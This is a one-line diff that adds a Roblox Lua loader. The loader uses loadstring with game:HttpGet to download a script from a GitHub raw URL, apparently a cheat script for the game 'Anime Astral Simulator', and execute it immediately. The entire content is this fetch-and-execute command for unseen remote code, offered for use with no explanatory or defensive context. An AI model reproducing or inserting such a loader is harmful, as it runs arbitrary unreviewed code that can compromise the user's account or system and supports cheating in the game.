@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/mafuba-anime-astral-simulator-spam5-b6snc2q5ig1f57.lua"))()
